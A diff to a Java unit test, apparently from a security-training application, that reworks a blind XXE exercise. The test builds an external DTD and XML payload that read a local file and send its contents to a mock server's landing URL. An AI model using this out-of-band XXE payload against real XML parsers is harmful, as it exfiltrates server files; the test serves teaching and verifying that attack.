@@ -136,9 +136,13 @@ class BlindSendFileAssignmentTest extends LessonTest {
     // Host DTD on WebWolf site
     String dtd =
         "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
+            + "<!ENTITY % file SYSTEM \""
+            + targetFile.toURI().toString()
+            + "\">\n"
             + "<!ENTITY % all \"<!ENTITY send SYSTEM 'http://localhost:"
             + port
-            + "/landing?text=%file;'>\">\n";
+            + "/landing?text=%file;'>\">\n"
+            + "%all;";
     webwolfServer.stubFor(
         WireMock.get(WireMock.urlMatching("/files/test.dtd"))
             .willReturn(aResponse().withStatus(200).withBody(dtd)));
@@ -149,14 +153,10 @@ class BlindSendFileAssignmentTest extends LessonTest {
     String xml =
         "<?xml version=\"1.0\"?>"
             + "<!DOCTYPE comment ["
-            + "<!ENTITY % file SYSTEM \""
-            + targetFile.toURI()
-            + "\">\n"
             + "<!ENTITY % remote SYSTEM \"http://localhost:"
             + port
             + "/files/test.dtd\">"
             + "%remote;"
-            + "%all;"
             + "]>"
             + "<comment><text>test&send;</text></comment>";
     performXXE(xml);
